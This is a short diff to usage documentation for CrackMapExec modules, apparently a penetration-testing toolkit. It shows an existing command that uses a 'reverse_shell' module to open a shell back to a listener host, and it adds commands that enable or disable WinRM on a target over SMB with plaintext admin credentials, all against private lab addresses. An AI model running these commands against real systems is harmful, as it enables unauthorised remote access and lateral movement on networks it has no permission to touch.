@@ -9,3 +9,10 @@ crackmapexec smb 192.168.163.144 -u 'Admin2' -p 'Password!' -M file_discovery -o
 ````console
 crackmapexec smb 192.168.163.144 -u 'Admin2' -p 'Password!' -M reverse_shell -o LHOST=192.168.163.136 LPORT=1234 HTTP_SERVER=8443
 ````
+
+## Usage of winrm
+
+````console
+crackmapexec smb 192.168.163.142 -u Admin2 -p 'Password123!' -M winrm -o ACTION=ENABLE
+crackmapexec smb 192.168.163.142 -u Admin2 -p 'Password123!' -M winrm -o ACTION=DISABLE
+````
